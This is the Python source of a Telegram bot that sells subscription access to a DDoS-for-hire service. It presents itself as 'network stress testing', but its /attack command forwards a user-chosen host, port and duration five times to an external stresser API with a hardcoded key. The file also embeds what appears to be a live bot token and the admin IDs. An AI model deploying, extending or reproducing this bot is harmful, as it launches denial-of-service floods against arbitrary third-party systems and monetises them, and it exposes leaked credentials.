import telebot
import requests
import datetime
import time
import os
import logging
import random
import string

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7092421248:AAH7o6xQAQZMjsmpkWD1m6sC1_D_WnDRIc0')

# Owner and admin user IDs
owner_id = "6552242136"
admin_ids = ["1086318600", "6552242136"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 900,
    "month": 1800
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the Network Stress Testing Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month)\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approveusser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

# Function to handle cooldown removal message
def cooldown_removal(user_id):
    response = "Your cooldown period has ended. You can now use the /attack command again."
    bot.send_message(user_id, response)

# Function to start attack reply
def start_attack_reply(chat_id, target, port, duration, response_text, success_count):
    response = (
        f"🔥 Attack Started! 🔥\n\n"
        f"Target: {target}\n"
        f"Port: {port}\n"
        f"Duration: {duration} seconds\n"
        f"Method: UDP-PUBG\n"
        f"Number of attacks sent: {success_count}\n"
        f"Thanks for using the DDoS Service."
    )
    bot.send_message(chat_id, response)

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        response = "You are not authorized to use this bot. Contact admin for access."
        bot.send_message(message.chat.id, response)
        return

    if user_id in attack_cooldown and time.time() - attack_cooldown[user_id] < 60:
        response = f"⏳ Please wait {60 - (time.time() - attack_cooldown[user_id]):.1f} seconds before using the /attack command again."
        bot.send_message(message.chat.id, response)
        return

    command = message.text.split()
    if len(command) < 4:
        response = "Usage: /attack <host> <port> <time>"
        bot.send_message(message.chat.id, response)
        return

    target = command[1]
    port = command[2]
    duration = int(command[3])
    method = "UDP-PUBG"  # Default method

    api_url = "https://api.stresser.website/start.php"
    api_key = "8tv0a-6xjdr-t7w6p-aqrd7"

    payload = {
        "key": api_key,
        "host": target,
        "port": port,
        "time": duration,
        "method": method
    }

    success_count = 0
    for _ in range(5):
        response = requests.get(api_url, params=payload)
        if response.status_code == 200:
            success_count += 1
            # Log the command
            log_command(user_id, target, port, duration)
        time.sleep(1)  # Adding a small delay between requests

    if success_count > 0:
        attack_cooldown[user_id] = time.time()  # Update the last attack time
        # Send response
        start_attack_reply(message.chat.id, target, port, duration, response.text, success_count)
        # Schedule cooldown removal message
        time.sleep(60)  # Wait for cooldown period
        cooldown_removal(user_id)  # Send cooldown removal message
    else:
        bot.send_message(message.chat.id, "Failed to start the attack. Please try again later.")

@bot.message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the AGEON THE CONQUEROR Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)